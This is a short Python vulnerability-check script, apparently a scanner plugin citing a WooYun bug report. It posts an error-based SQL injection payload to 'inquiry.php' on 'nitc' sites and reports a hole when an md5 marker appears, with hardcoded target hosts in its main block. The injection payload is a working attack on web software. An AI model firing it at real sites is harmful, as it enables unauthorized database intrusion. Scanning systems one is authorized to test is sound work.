#!/usr/bin/env python
# -*- coding: utf-8 -*-
# http://www.wooyun.org/bugs/wooyun-2010-081305

def assign(service, arg):
    if service == "nitc":
        return True, arg

def audit(arg):
    url = arg + "inquiry.php"
    post = "product[]=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,md5(123),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)#"
    code, head, res, errcode, _ = curl.curl2(url,post)
    if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('nitc','http://test.nitc.cc/')[1])
    audit(assign('nitc','http://nitc.cc/')[1])